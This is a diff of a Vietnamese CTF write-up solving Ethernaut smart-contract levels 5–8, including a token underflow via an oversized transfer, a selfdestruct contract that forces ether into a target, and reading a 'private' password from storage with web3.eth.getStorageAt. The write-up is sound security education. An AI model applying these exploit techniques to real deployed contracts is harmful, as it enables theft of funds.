@@ -1,6 +1,6 @@
 ---
 layout: post
-title: "Blockchain - hacking smart contract with Ethernaut CTF (Part 2)"
+title: "The Ethernaut - Part 2: 5-8"
 mathjax: true
 ---
 Chào các bạn, hôm nay chúng ta sẽ đến với phần 2 của chuỗi bài *Blockchain - hacking smart contract with Ethernaut CTF*
@@ -58,7 +58,7 @@ await contract.balanceOf(player).then(x => x.toNumber())
 20
 ```
 
-- Do điều kiện auto pass, ta sẽ transfer cho một địa chỉ nào đó một giá trị lớn hơn 20 - là số token hiện tại của ta, khi đó phép toán `balances[msg.sender] -= value` sẽ xảy ra hiện tượng *underflow* và ta sẽ sở hữu một lượng **vô cùng lớn** token: 
+- Do điều kiện auto pass, ta sẽ transfer cho một địa chỉ nào đó một giá trị lớn hơn 20 - là số token hiện tại của ta, khi đó phép toán `balances[msg.sender] -= value` sẽ xảy ra hiện tượng *underflow* và ta sẽ sở hữu một lượng **vô cùng lớn** token:
 
 ```js
 contract.transfer(player, 21)
@@ -73,7 +73,7 @@ await contract.balanceOf(player).then(x => x.toNumber())
 
 - Submit & all done!
 
-### Bình luận 
+### Bình luận
 
 - Overflow hay Underflow đều nguy hiểm, hãy dùng thư viện [Safe Math](https://github.com/OpenZeppelin/zeppelin-solidity/blob/master/contracts/math/SafeMath.sol) cho bất cứ phép toán nào của bạn.
 
@@ -173,24 +173,24 @@ contract Force {/*
 
 ### Phân tích
 
-- Contract không tí code nào - wtf ? 
+- Contract không tí code nào - wtf ?
 - Đây là một bài thuộc dạng bài *biết thì rất dễ, không biết thì không biết đằng nào mà lần*. Điều ta cần biết duy nhất chính là hàm `selfdestruct`.
 - Với một contract, khi gọi hàm `selfdestruct(someone_addr)` thì contract sẽ hủy và toàn bộ tiền của contract sẽ gửi về someone_addr, đây có thể là địa chỉ bất kì của người dùng hoặc của contract nào đó.
- 
+
 ### Solution
 
 - Trên Remix IDE, chuẩn bị một contract có thể gửi tiền vào, và một hàm thực hiện `selfdestruct` trong đó, nhớ thay địa chỉ trong `selfdestruct` bằng địa chỉ instance của bạn:
 
 ```js
 contract AnotherContract {
-    
+
     function sendAll() public {
         // replace by your instance address
         selfdestruct(0xb3a12d511131ada7a145a5a9dc7399756cae6c4b);
     }
-    
+
     function() public payable {
-        
+
     }
 }
 ```
@@ -205,7 +205,7 @@ contract AnotherContract {
 
 ## 8. Vault　★★★☆☆☆　
 
-**Nhiệm vụ**: Tìm password và unlock 
+**Nhiệm vụ**: Tìm password và unlock
 
 ```js
 pragma solidity ^0.4.18;
@@ -227,17 +227,19 @@ contract Vault {
 }
 ```
 
-### Phân tích 
+### Phân tích
 
-- Ta biết rằng blockchain là minh bạch, và mọi thông tin trên đó ta đều có thể nhìn thấy được, và trong bài này, điều đó không là ngoại lệ.
+- Ta biết rằng blockchain là minh bạch, và mọi thông tin trên đó ta đều có thể nhìn thấy được, kể cả những biến khai báo là `private`. Và trong bài này, điều đó không là ngoại lệ.
 - web3js cung cấp cho ta một hàm `web3.eth.getStorageAt` để lấy thông tin trên blockchain. Ta sẽ dùng nó để tìm password.
 
 ### Solution
 
-- Hàm constructor có tên hàm & một tham số, vậy nên ta sẽ phải gọi callback function với 2 tham số trả về, ở đây là x & y, và hãy thay địa chỉ bằng địa chỉ instance của bạn 
+- Contract Vault có 2 tham số: `looked` và `password`, nó sẽ lưu `looked` tại vị trí 0 và `password` tại vị trí 1 trong storage.
+- `password` có kiểu dữ liệu là bytes32, nên để hiển thị ra ký tự ASCII ta phải dùng hàm `web3.toAscii`
+- Trong chrome console, ta chạy lệnh sau, lưu ý thay địa chỉ bằng địa chỉ instance của bạn
 
 ```js
-web3.eth.getStorageAt("0x712d4d349abd61d1ff12be06f8ff55cc7fb1052b", 1, function(x, y) {alert(web3.toAscii(y))})
+web3.eth.getStorageAt("0x712d4d349abd61d1ff12be06f8ff55cc7fb1052b", 1, (err, result) => alert(web3.toAscii(result)))
 ```
 
 - Yeah, ta nhận được password là: `A very strong secret password :)`
@@ -254,7 +256,7 @@ await contract.locked.call();
 false
 ```
 
-- Submit & all done! 
+- Submit & all done!
 
 ### Bình luận
 
